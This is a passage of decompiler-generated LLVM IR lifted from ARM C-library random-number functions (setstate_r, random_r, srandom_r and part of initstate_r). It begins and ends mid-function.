  store i32 %v3_13cd4, i32* @r4, align 4
  store i32 %v6_13cd4, i32* @r5, align 4
  store i32 %v9_13cd4, i32* @r6, align 4
  store i32 %v15_13cd4, i32* @lr, align 4
  ret i32 %v2_13ce8
}

define i32 @function_13d60(i64* %arg1) local_unnamed_addr {
dec_label_pc_13d60:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13d60 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13d60, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13d60
  %v2_13d68 = load i32, i32* @ip, align 4
  %v9_13d70 = sub i32 0, %v2_13d68
  %v2_13d74 = load i32, i32* @r8, align 4
  %v8_13d74 = shl i32 %v2_13d74, %v9_13d70
  %v9_13d74 = and i32 %v8_13d74, %v9_13d70
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13d60, %bb
  %v10_13d74 = phi i32 [ %tmp, %dec_label_pc_13d60 ], [ %v9_13d74, %bb ]
  ret i32 %v10_13d74

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13d78 = load i32, i32* @r4, align 4
  store i32 %v3_13d78, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_13d80 = add i32 %tmp, 12
  %v2_13d80 = inttoptr i32 %v1_13d80 to i8*
  %v3_13d80 = load i8, i8* %v2_13d80, align 1
  %v4_13d80 = zext i8 %v3_13d80 to i32
  store i32 %v4_13d80, i32* %r1.global-to-local, align 4
  %v2_13d84 = icmp eq i8 %v3_13d80, 0
  store i1 %v2_13d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d84, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_13d8c12 = add i32 %arg1, 4
  store i32 %v1_13d8c12, i32* %r6.global-to-local, align 4
  %v1_13d9013 = add i32 %tmp, 8
  %v2_13d9014 = inttoptr i32 %v1_13d9013 to i32*
  %v3_13d9015 = load i32, i32* %v2_13d9014, align 4
  store i32 %v3_13d9015, i32* %r0.global-to-local, align 4
  %v3_13dac = add i32 %v3_13d9015, -4
  %v4_13dac = inttoptr i32 %v3_13dac to i32*
  store i32 %v4_13d80, i32* %v4_13dac, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_13d88 = add i32 %tmp, 4
  %v3_13d88 = inttoptr i32 %v2_13d88 to i32*
  %v4_13d88 = load i32, i32* %v3_13d88, align 4
  %v1_13d8c = add i32 %arg1, 4
  store i32 %v1_13d8c, i32* %r6.global-to-local, align 4
  %v1_13d90 = add i32 %tmp, 8
  %v2_13d90 = inttoptr i32 %v1_13d90 to i32*
  %v3_13d90 = load i32, i32* %v2_13d90, align 4
  store i32 %v3_13d90, i32* %r0.global-to-local, align 4
  %v3_13d98 = sub i32 %v4_13d88, %v3_13d90
  %v4_13d9c = sdiv i32 %v3_13d98, 4
  %v4_13da0 = sext i8 %v3_13d80 to i32
  store i32 %v4_13da0, i32* %r1.global-to-local, align 4
  %v4_13da8 = mul i32 %v4_13d9c, 5
  %v5_13da8 = add i32 %v4_13da8, %v4_13da0
  %v3_13db0 = add i32 %v3_13d90, -4
  %v4_13db0 = inttoptr i32 %v3_13db0 to i32*
  store i32 %v5_13da8, i32* %v4_13db0, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_13db8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13db8 = add i32 %v0_13db8, -4
  %v2_13db8 = inttoptr i32 %v1_13db8 to i32*
  %v3_13db8 = load i32, i32* %v2_13db8, align 4
  %v2_13dc0 = udiv i32 %v3_13db8, 5
  %v3_13dc0 = urem i32 %v3_13db8, 5
  store i32 %v2_13dc0, i32* %r0.global-to-local, align 4
  store i32 %v3_13dc0, i32* %r1.global-to-local, align 4
  %v2_13dc8 = icmp ugt i32 %v3_13dc0, 3
  %v7_13dc8 = icmp eq i32 %v3_13dc0, 4
  store i1 %v7_13dc8, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r5.global-to-local, align 4
  %v2_13dd0 = xor i1 %v7_13dc8, true
  %v3_13dd0 = and i1 %v2_13dc8, %v2_13dd0
  br i1 %v3_13dd0, label %dec_label_pc_13e38, label %dec_label_pc_13dd4

dec_label_pc_13dd4:                               ; preds = %bb
  %v4_13ddc = mul nuw nsw i32 %v3_13dc0, 4
  %v5_13ddc = add i32 %v4_13ddc, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33968)
  %v1_13de0 = add i32 %v4_13ddc, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33948)
  %v2_13de0 = inttoptr i32 %v1_13de0 to i32*
  %v3_13de0 = load i32, i32* %v2_13de0, align 4
  store i32 %v3_13de0, i32* %r5.global-to-local, align 4
  %v6_13de4 = inttoptr i32 %v5_13ddc to i32*
  %v7_13de4 = load i32, i32* %v6_13de4, align 4
  store i32 %v7_13de4, i32* %r7.global-to-local, align 4
  %v2_13de8 = icmp eq i32 %v3_13dc0, 0
  store i1 %v2_13de8, i1* %cpsr_z.global-to-local, align 1
  %v1_13dec = trunc i32 %v3_13de0 to i8
  %v2_13dec = load i32, i32* %r4.global-to-local, align 4
  %v3_13dec = add i32 %v2_13dec, 13
  %v4_13dec = inttoptr i32 %v3_13dec to i8*
  store i8 %v1_13dec, i8* %v4_13dec, align 1
  %v0_13df0 = load i32, i32* %r7.global-to-local, align 4
  %v1_13df0 = trunc i32 %v0_13df0 to i8
  %v2_13df0 = load i32, i32* %r4.global-to-local, align 4
  %v3_13df0 = add i32 %v2_13df0, 14
  %v4_13df0 = inttoptr i32 %v3_13df0 to i8*
  store i8 %v1_13df0, i8* %v4_13df0, align 1
  %v0_13df4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13df4 = trunc i32 %v0_13df4 to i8
  %v2_13df4 = load i32, i32* %r4.global-to-local, align 4
  %v3_13df4 = add i32 %v2_13df4, 12
  %v4_13df4 = inttoptr i32 %v3_13df4 to i8*
  store i8 %v1_13df4, i8* %v4_13df4, align 1
  %v0_13df8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13df8, label %dec_label_pc_13e24, label %dec_label_pc_13dfc

dec_label_pc_13dfc:                               ; preds = %dec_label_pc_13dd4
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_13e00 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e00 = add i32 %v0_13e00, -4
  %v2_13e00 = inttoptr i32 %v1_13e00 to i32*
  %v3_13e00 = load i32, i32* %v2_13e00, align 4
  %v2_13e04 = sdiv i32 %v3_13e00, 5
  store i32 %v2_13e04, i32* %r0.global-to-local, align 4
  %v4_13e08 = mul i32 %v2_13e04, 4
  %v5_13e08 = add i32 %v4_13e08, %v0_13e00
  %v1_13e0c = load i32, i32* %r4.global-to-local, align 4
  %v2_13e0c = add i32 %v1_13e0c, 4
  %v3_13e0c = inttoptr i32 %v2_13e0c to i32*
  store i32 %v5_13e08, i32* %v3_13e0c, align 4
  %v0_13e10 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e10 = load i32, i32* %r0.global-to-local, align 4
  %v2_13e10 = add i32 %v1_13e10, %v0_13e10
  %v0_13e14 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e18 = udiv i32 %v2_13e10, %v0_13e14
  %v3_13e18 = urem i32 %v2_13e10, %v0_13e14
  store i32 %v2_13e18, i32* %r0.global-to-local, align 4
  %v0_13e1c = load i32, i32* %r6.global-to-local, align 4
  %v4_13e1c = mul i32 %v3_13e18, 4
  %v5_13e1c = add i32 %v0_13e1c, %v4_13e1c
  store i32 %v5_13e1c, i32* %r1.global-to-local, align 4
  %v1_13e20 = load i32, i32* %r4.global-to-local, align 4
  %v2_13e20 = inttoptr i32 %v1_13e20 to i32*
  store i32 %v5_13e1c, i32* %v2_13e20, align 4
  br label %dec_label_pc_13e24

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13dd4, %dec_label_pc_13dfc
  %v0_13e24 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e24 = load i32, i32* %r5.global-to-local, align 4
  %v4_13e24 = mul i32 %v1_13e24, 4
  %v5_13e24 = add i32 %v4_13e24, %v0_13e24
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13e2c = load i32, i32* %r4.global-to-local, align 4
  %v2_13e2c = add i32 %v1_13e2c, 16
  %v3_13e2c = inttoptr i32 %v2_13e2c to i32*
  store i32 %v5_13e24, i32* %v3_13e2c, align 4
  %v0_13e30 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e30 = load i32, i32* %r4.global-to-local, align 4
  %v2_13e30 = add i32 %v1_13e30, 8
  %v3_13e30 = inttoptr i32 %v2_13e30 to i32*
  store i32 %v0_13e30, i32* %v3_13e30, align 4
  %v1_13e50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13e48

dec_label_pc_13e38:                               ; preds = %bb
  %v0_13e38 = call i32 @__GI___errno_location()
  %v2_13e40 = inttoptr i32 %v0_13e38 to i32*
  store i32 22, i32* %v2_13e40, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e24, %dec_label_pc_13e38
  %v1_13e50 = phi i32 [ %v1_13e50.pre, %dec_label_pc_13e24 ], [ -1, %dec_label_pc_13e38 ]
  %v2_13e4c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13e4c, i32* @r4, align 4
  ret i32 %v1_13e50

; uselistorder directives
  uselistorder i32 %v0_13e14, { 1, 0 }
  uselistorder i32 %v2_13e10, { 1, 0 }
  uselistorder i32 %v3_13db8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e48, { 1, 0 }
  uselistorder label %dec_label_pc_13e24, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e5c = load i32, i32* @r4, align 4
  store i32 %v3_13e5c, i32* %stack_var_-8, align 4
  %v1_13e60 = add i32 %tmp, 12
  %v2_13e60 = inttoptr i32 %v1_13e60 to i8*
  %v3_13e60 = load i8, i8* %v2_13e60, align 1
  %v4_13e60 = sext i8 %v3_13e60 to i32
  store i32 %v4_13e60, i32* %r3.global-to-local, align 4
  %v2_13e64 = icmp eq i8 %v3_13e60, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_13e70 = add i32 %tmp, 8
  %v2_13e70 = inttoptr i32 %v1_13e70 to i32*
  %v3_13e70 = load i32, i32* %v2_13e70, align 4
  store i32 %v3_13e70, i32* %lr.global-to-local, align 4
  br i1 %v2_13e64, label %dec_label_pc_13e78, label %dec_label_pc_13e9c

dec_label_pc_13e78:                               ; preds = %entry
  %v1_13e78 = inttoptr i32 %v3_13e70 to i32*
  %v2_13e78 = load i32, i32* %v1_13e78, align 4
  store i32 %v2_13e78, i32* %r2.global-to-local, align 4
  %v2_13e80 = mul i32 %v2_13e78, 1103515245
  %v1_13e88 = add i32 %v2_13e80, 12345
  %tmp6 = bitcast i32 %v1_13e88 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_13e8c = bitcast float %tmp7 to i32
  store i32 %v1_13e8c, i32* %r3.global-to-local, align 4
  store i32 %v1_13e8c, i32* %v1_13e78, align 4
  %v0_13e94 = load i32, i32* %r3.global-to-local, align 4
  %v2_13e94 = inttoptr i32 %arg2 to i32*
  store i32 %v0_13e94, i32* %v2_13e94, align 4
  br label %dec_label_pc_13edc

dec_label_pc_13e9c:                               ; preds = %entry
  %v2_13e9c = load i32, i32* %arg1, align 4
  store i32 %v2_13e9c, i32* %r2.global-to-local, align 4
  %v1_13ea0 = add i32 %tmp, 4
  %v2_13ea0 = inttoptr i32 %v1_13ea0 to i32*
  %v3_13ea0 = load i32, i32* %v2_13ea0, align 4
  store i32 %v3_13ea0, i32* %r0.global-to-local, align 4
  %v1_13ea4 = inttoptr i32 %v2_13e9c to i32*
  %v2_13ea4 = load i32, i32* %v1_13ea4, align 4
  store i32 %v2_13ea4, i32* %r1.global-to-local, align 4
  %v1_13ea8 = inttoptr i32 %v3_13ea0 to i32*
  %v2_13ea8 = load i32, i32* %v1_13ea8, align 4
  %v4_13ea8 = add i32 %v3_13ea0, 4
  store i32 %v4_13ea8, i32* %r0.global-to-local, align 4
  %v2_13eac = add i32 %v2_13ea8, %v2_13ea4
  store i32 %v2_13eac, i32* %r3.global-to-local, align 4
  store i32 %v2_13eac, i32* %v1_13ea4, align 4
  %v3_13eb0 = load i32, i32* %r2.global-to-local, align 4
  %v4_13eb0 = add i32 %v3_13eb0, 4
  store i32 %v4_13eb0, i32* %r2.global-to-local, align 4
  %v0_13eb4 = load i32, i32* %ip.global-to-local, align 4
  %v1_13eb4 = add i32 %v0_13eb4, 16
  %v2_13eb4 = inttoptr i32 %v1_13eb4 to i32*
  %v3_13eb4 = load i32, i32* %v2_13eb4, align 4
  store i32 %v3_13eb4, i32* %r1.global-to-local, align 4
  %v0_13eb8 = load i32, i32* %r3.global-to-local, align 4
  %v3_13eb8 = udiv i32 %v0_13eb8, 2
  store i32 %v3_13eb8, i32* %r3.global-to-local, align 4
  %v3_13ebc = icmp ult i32 %v4_13eb0, %v3_13eb4
  %v1_13ec0 = load i32, i32* %r4.global-to-local, align 4
  %v2_13ec0 = inttoptr i32 %v1_13ec0 to i32*
  store i32 %v3_13eb8, i32* %v2_13ec0, align 4
  br i1 %v3_13ebc, label %dec_label_pc_13ecc, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_13e9c
  %v1_13ec4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13ec4, i32* %r2.global-to-local, align 4
  %v0_13ed4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_13ecc:                               ; preds = %dec_label_pc_13e9c
  %v0_13ecc = load i32, i32* %r0.global-to-local, align 4
  %v1_13ecc = load i32, i32* %r1.global-to-local, align 4
  %v3_13ecc = icmp ult i32 %v0_13ecc, %v1_13ecc
  br i1 %v3_13ecc, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_13ecc
  %v1_13ed0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13ed0, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_13ecc, %._crit_edge, %bb
  %v0_13ed4 = phi i32 [ %v0_13ed4.pre, %._crit_edge ], [ %v0_13ecc, %dec_label_pc_13ecc ], [ %v1_13ed0, %bb ]
  %v1_13ed4 = load i32, i32* %ip.global-to-local, align 4
  %v2_13ed4 = add i32 %v1_13ed4, 4
  %v3_13ed4 = inttoptr i32 %v2_13ed4 to i32*
  store i32 %v0_13ed4, i32* %v3_13ed4, align 4
  %v0_13ed8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ed8 = load i32, i32* %ip.global-to-local, align 4
  %v2_13ed8 = inttoptr i32 %v1_13ed8 to i32*
  store i32 %v0_13ed8, i32* %v2_13ed8, align 4
  br label %dec_label_pc_13edc

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13e78, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13ee0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ee0, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_13eb8, { 1, 0 }
  uselistorder i32 %v1_13e8c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_13edc, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13eec = load i32, i32* @r4, align 4
  store i32 %v3_13eec, i32* %stack_var_-36, align 4
  %v1_13ef0 = add i32 %tmp, 12
  %v2_13ef0 = inttoptr i32 %v1_13ef0 to i8*
  %v3_13ef0 = load i8, i8* %v2_13ef0, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_13f00 = load i8, i8* %v2_13ef0, align 1
  %tmp33 = icmp ugt i8 %v3_13ef0, 4
  br i1 %tmp33, label %.dec_label_pc_13fac_crit_edge, label %dec_label_pc_13f0c

.dec_label_pc_13fac_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_13fac

dec_label_pc_13f0c:                               ; preds = %entry
  %v0_13f0c = load i32, i32* @r0, align 4
  %v2_13f0c = icmp eq i32 %v0_13f0c, 0
  %v1_13f10 = add i32 %tmp, 8
  %v2_13f10 = inttoptr i32 %v1_13f10 to i32*
  %v3_13f10 = load i32, i32* %v2_13f10, align 4
  store i32 %v3_13f10, i32* %r6.global-to-local, align 4
  br i1 %v2_13f0c, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_13f0c
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13f0c, %bb
  %v0_13f1c = phi i32 [ %v0_13f0c, %dec_label_pc_13f0c ], [ 1, %bb ]
  %v2_13f18 = icmp eq i8 %v3_13f00, 0
  %v2_13f1c = inttoptr i32 %v3_13f10 to i32*
  store i32 %v0_13f1c, i32* %v2_13f1c, align 4
  br i1 %v2_13f18, label %dec_label_pc_13fa8, label %dec_label_pc_13f24

dec_label_pc_13f24:                               ; preds = %bb23
  %v1_13f24 = add i32 %tmp, 13
  %v2_13f24 = inttoptr i32 %v1_13f24 to i8*
  %v3_13f24 = load i8, i8* %v2_13f24, align 1
  %v4_13f24 = sext i8 %v3_13f24 to i32
  store i32 %v4_13f24, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_13f30 = load i32, i32* @r0, align 4
  store i32 %v0_13f30, i32* %r4.global-to-local, align 4
  %v0_13f34 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13f34, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_13f7425 = icmp sgt i8 %v3_13f24, 1
  br i1 %v5_13f7425, label %dec_label_pc_13f40, label %dec_label_pc_13f78

dec_label_pc_13f40:                               ; preds = %dec_label_pc_13f24, %dec_label_pc_13f40.dec_label_pc_13f40_crit_edge
  %v1_13f54 = phi i32 [ %v1_13f54.pre, %dec_label_pc_13f40.dec_label_pc_13f40_crit_edge ], [ 2836, %dec_label_pc_13f24 ]
  %v1_13f48 = phi i32 [ %v1_13f48.pre, %dec_label_pc_13f40.dec_label_pc_13f40_crit_edge ], [ 16807, %dec_label_pc_13f24 ]
  %v0_13f4427 = phi i32 [ %v0_13f68.pre, %dec_label_pc_13f40.dec_label_pc_13f40_crit_edge ], [ %v0_13f30, %dec_label_pc_13f24 ]
  %v1_13f6026 = phi i32 [ %v5_13f60, %dec_label_pc_13f40.dec_label_pc_13f40_crit_edge ], [ %v0_13f34, %dec_label_pc_13f24 ]
  %v3_13f40 = urem i32 %v0_13f4427, 127773
  %v2_13f48 = mul i32 %v1_13f48, %v3_13f40
  %v2_13f50 = sdiv i32 %v0_13f4427, 127773
  %v2_13f54 = mul i32 %v1_13f54, %v2_13f50
  %v2_13f58 = sub i32 %v2_13f48, %v2_13f54
  %v8_13f58 = icmp slt i32 %v2_13f58, 0
  %v2_13f5c = add i32 %v2_13f58, 2147483647
  %v2_13f5c.v2_13f58 = select i1 %v8_13f58, i32 %v2_13f5c, i32 %v2_13f58
  store i32 %v2_13f5c.v2_13f58, i32* %r4.global-to-local, align 4
  %v2_13f60 = add i32 %v1_13f6026, 4
  %v3_13f60 = inttoptr i32 %v2_13f60 to i32*
  store i32 %v2_13f5c.v2_13f58, i32* %v3_13f60, align 4
  %v4_13f60 = load i32, i32* %r8.global-to-local, align 4
  %v5_13f60 = add i32 %v4_13f60, 4
  store i32 %v5_13f60, i32* %r8.global-to-local, align 4
  %v0_13f64.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_13f64.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_13f68.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13f70 = add i32 %v0_13f64.pre, 1
  store i32 %v1_13f70, i32* %r7.global-to-local, align 4
  %v5_13f74 = icmp slt i32 %v0_13f64.pre, %v1_13f64.pre
  br i1 %v5_13f74, label %dec_label_pc_13f40.dec_label_pc_13f40_crit_edge, label %dec_label_pc_13f64.dec_label_pc_13f78_crit_edge

dec_label_pc_13f40.dec_label_pc_13f40_crit_edge:  ; preds = %dec_label_pc_13f40
  %v1_13f48.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_13f54.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13f40

dec_label_pc_13f64.dec_label_pc_13f78_crit_edge:  ; preds = %dec_label_pc_13f40
  %v0_13f88.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13f78

dec_label_pc_13f78:                               ; preds = %dec_label_pc_13f64.dec_label_pc_13f78_crit_edge, %dec_label_pc_13f24
  %v0_13f88 = phi i32 [ %v0_13f88.pre, %dec_label_pc_13f64.dec_label_pc_13f78_crit_edge ], [ %v0_13f34, %dec_label_pc_13f24 ]
  %v0_13f7c.lcssa = phi i32 [ %v1_13f64.pre, %dec_label_pc_13f64.dec_label_pc_13f78_crit_edge ], [ %v4_13f24, %dec_label_pc_13f24 ]
  %v2_13f7c = mul i32 %v0_13f7c.lcssa, 10
  store i32 %v2_13f7c, i32* @r4, align 4
  %v0_13f80 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f80 = add i32 %v0_13f80, 14
  %v2_13f80 = inttoptr i32 %v1_13f80 to i8*
  %v3_13f80 = load i8, i8* %v2_13f80, align 1
  %v4_13f80 = sext i8 %v3_13f80 to i32
  %v2_13f84 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_13f84, i32* %r7.global-to-local, align 4
  %v4_13f88 = mul nsw i32 %v4_13f80, 4
  %v5_13f88 = add i32 %v0_13f88, %v4_13f88
  %v1_13f8c = inttoptr i32 %v0_13f80 to i32*
  store i32 %v5_13f88, i32* %v1_13f8c, align 4
  %v3_13f8c = add i32 %v0_13f80, 4
  %v4_13f8c = inttoptr i32 %v3_13f8c to i32*
  %v5_13f8c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_13f8c, i32* %v4_13f8c, align 4
  br label %dec_label_pc_13f98

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f98
  %v0_13f9c = load i32, i32* %r5.global-to-local, align 4
  %v2_13f94 = inttoptr i32 %v0_13f9c to i32*
  %v3_13f94 = call i32 @__GI_random_r(i32* %v2_13f94, i32 %v2_13f84)
  br label %dec_label_pc_13f98

dec_label_pc_13f98:                               ; preds = %dec_label_pc_13f78, %dec_label_pc_13f94
  %v0_13f98 = load i32, i32* @r4, align 4
  %v1_13f98 = add i32 %v0_13f98, -1
  store i32 %v1_13f98, i32* @r4, align 4
  %v6_13f98 = icmp slt i32 %v1_13f98, 0
  br i1 %v6_13f98, label %dec_label_pc_13fa8, label %dec_label_pc_13f94

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13f98, %bb23
  %v2_13fb0.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_13fac

dec_label_pc_13fac:                               ; preds = %.dec_label_pc_13fac_crit_edge, %dec_label_pc_13fa8
  %v2_13fb0 = phi i32 [ %v3_13eec, %.dec_label_pc_13fac_crit_edge ], [ %v2_13fb0.pre, %dec_label_pc_13fa8 ]
  %v1_13fb4 = phi i32 [ -1, %.dec_label_pc_13fac_crit_edge ], [ 0, %dec_label_pc_13fa8 ]
  store i32 %v2_13fb0, i32* @r4, align 4
  ret i32 %v1_13fb4

; uselistorder directives
  uselistorder i32 %v1_13f98, { 1, 0 }
  uselistorder i32 %v0_13f80, { 1, 0, 2 }
  uselistorder i32 %v0_13f64.pre, { 1, 0 }
  uselistorder i32 %v5_13f60, { 1, 0 }
  uselistorder i32 %v0_13f4427, { 1, 0 }
  uselistorder i32 %v0_13f34, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_13fac, { 1, 0 }
  uselistorder label %dec_label_pc_13f98, { 1, 0 }
  uselistorder label %dec_label_pc_13f40, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13fb8:
  %v0_13fb8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13fb8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13fb8
  %v2_13fb8 = load i32, i32* @r7, align 4
  %v5_13fb8 = udiv i32 %v2_13fb8, 8
  %v6_13fb8 = and i32 %v5_13fb8, %arg1
  %v3_13fbc = load i32, i32* @fp, align 4
  %v8_13fbc = shl i32 %v6_13fb8, %v3_13fbc
  %v9_13fbc = and i32 %v8_13fbc, %arg1
  %v2_13fc0 = load i32, i32* @sp, align 4
  %v8_13fc0 = shl i32 %v2_13fc0, %arg3
  %v9_13fc0 = and i32 %v8_13fc0, %arg2
  call void @__pseudo_branch(i32 %v9_13fc0)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13fb8, %bb
  %v10_13fc0 = phi i32 [ %arg1, %dec_label_pc_13fb8 ], [ %v9_13fbc, %bb ]
  ret i32 %v10_13fc0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_13fc4 = load i32, i32* @r4, align 4
  %v6_13fc4 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_13ff4, label %dec_label_pc_13fe4

dec_label_pc_13fe4:                               ; preds = %entry
  %v2_13fe4 = icmp ugt i32 %arg2, 254
  %v7_13fe4 = icmp eq i32 %arg2, 255
  %v2_13fe8 = xor i1 %v7_13fe4, true
  %v3_13fe8 = and i1 %v2_13fe4, %v2_13fe8
  br i1 %v3_13fe8, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_13fe4
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13fe4, %bb
  %v1_140207 = phi i32 [ %v3_13fc4, %dec_label_pc_13fe4 ], [ 4, %bb ]
  %v2_13fec = xor i1 %v2_13fe4, true
  %v3_13fec = or i1 %v7_13fe4, %v2_13fec
  br i1 %v3_13fec, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_13ff4:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
